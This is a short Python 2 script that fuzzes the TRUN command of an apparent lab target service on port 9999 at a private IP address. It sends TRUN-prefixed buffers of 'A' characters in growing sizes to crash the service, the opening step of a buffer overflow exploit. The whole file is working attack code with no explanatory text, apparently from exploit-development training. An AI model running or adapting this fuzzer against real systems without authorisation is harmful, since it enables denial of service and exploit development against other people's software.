#! /usr/bin/python2
import socket;
import sys;

ip="10.0.5.52"
port = 9999 #default TRUN port
prefix = 'TRUN /.:/'

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
  print("Fuzzing TRUN with %s bytes " % len(string))
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  connect = s.connect((ip,port))
  s.send((prefix + string))
  s.close()
